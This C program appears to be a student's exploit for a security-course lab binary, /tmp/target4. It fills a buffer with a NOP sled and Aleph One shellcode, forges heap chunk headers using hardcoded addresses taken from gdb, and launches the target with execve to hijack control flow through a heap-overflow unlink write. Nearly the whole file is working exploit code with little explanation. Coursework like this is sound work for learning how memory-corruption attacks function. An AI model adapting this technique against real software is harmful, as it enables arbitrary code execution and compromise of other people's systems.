#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET   "/tmp/target4"
#define NOOP     0x90


//header for chunk
typedef union Chunk_T
{
  struct
    {
      union Chunk_T *left_chunk;
      union Chunk_T *right_chunk;
    } s;
  double x;
} Chunk_Tag;


int main(void)
{
  char *args[3];
  char *env[1];
  char buf[1024];


  //Steps
  //1. add noop sled to so that eip falls into noop for safe landing
  memset(buf, NOOP, 1024);

  //2. add shellcode from alephone
  strncpy(buf + 600, shellcode, 45);

  //3. Craft the chunk header as per the explanation
  void *new_ptr = (void*)buf + (0x8059948 - 0x8059878); //p pointer and q pointers addresses from gdb
  Chunk_Tag *p = -1 + (Chunk_Tag *)(new_ptr);

  p->s.left_chunk = (void*) 0x8059948;  //p pointers address from gdb 
  p->s.right_chunk = (void*) 0xbffffa7d; //new landing point inside our buffer containing shellcode

  Chunk_Tag *left_chunk = -1 + (Chunk_Tag *) (new_ptr + sizeof(Chunk_Tag));

  Chunk_Tag *right_chunk = -1 + (Chunk_Tag *)(new_ptr - sizeof(Chunk_Tag));

  //phrack's jump code
  strncpy((char*)left_chunk + 1, "\xeb", 1);
  strncpy((char*)left_chunk + 2, "\x0c", 1);

  *(unsigned *)&(left_chunk)->s.right_chunk |=  0x1;

  *(unsigned *)&(p)->s.right_chunk |=  0x1;
 
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;


  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;

}
